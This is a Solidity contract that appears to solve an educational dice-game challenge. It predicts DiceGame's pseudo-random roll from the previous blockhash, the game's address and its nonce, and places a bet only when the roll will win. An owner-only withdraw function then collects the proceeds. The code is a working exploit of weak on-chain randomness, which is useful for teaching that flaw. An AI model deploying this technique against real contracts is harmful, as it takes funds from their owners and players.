pragma solidity >=0.8.0 <0.9.0;
//SPDX-License-Identifier: MIT

import "hardhat/console.sol";
import "./DiceGame.sol";
import "@openzeppelin/contracts/access/Ownable.sol";

error RiggedRoll__notAWinner();
error RiggedRoll__transactionFailed();

contract RiggedRoll is Ownable {

    DiceGame public diceGame;

    constructor(address payable diceGameAddress) {
        diceGame = DiceGame(diceGameAddress);
    }

    receive() external payable {}

    function riggedRoll() public {
        bytes32 prevHash = blockhash(block.number - 1);
        
        bytes32 hash = keccak256(abi.encodePacked(prevHash, address(diceGame), diceGame.nonce()));
        uint256 roll = uint256(hash) % 16;

        if (roll > 2 ) {
            revert RiggedRoll__notAWinner();
        }
        require(address(this).balance >= .002 ether, "No ETH in Contract");
        uint256 valueToSend = 0.002 ether;
        diceGame.rollTheDice{value: valueToSend}();
    }

    function withdraw(address _addr, uint256 _amount) public onlyOwner {
        require(address(this).balance >= _amount, "amount is greater than contract balance");
        payable(_addr).transfer(_amount);
    }
}